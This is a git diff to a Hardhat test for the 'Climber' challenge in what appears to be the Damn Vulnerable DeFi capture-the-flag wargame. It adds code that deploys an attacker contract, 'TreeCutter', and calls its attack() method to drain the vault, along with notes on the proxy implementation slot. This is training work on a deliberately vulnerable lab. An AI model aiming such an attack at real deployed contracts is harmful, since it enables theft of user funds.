@@ -32,6 +32,8 @@ describe('[Challenge] Climber', function () {
         expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
         expect(await this.vault.owner()).to.not.eq(deployer.address);
         
+        console.log(await ethers.provider.getStorageAt('0x5fbdb2315678afecb367f032d93f642f64180aa3', 0))
+
         // Instantiate timelock
         let timelockAddress = await this.vault.owner();
         this.timelock = await (
@@ -49,10 +51,25 @@ describe('[Challenge] Climber', function () {
         // Deploy token and transfer initial token balance to the vault
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
+        
+        this.treeCutter = await (await ethers.getContractFactory('TreeCutter', attacker)).deploy(
+            this.vault.address,
+            this.timelock.address,
+            attacker.address,
+            this.token.address
+        )
+
     });
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // Implementation slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+        // Implementation address: 0x5fbdb2315678afecb367f032d93f642f64180aa3
+        // The tokens have been sent to the proxy contract: this.vault
+        await this.treeCutter.connect(attacker).attack()
+
+
+
     });
 
     after(async function () {
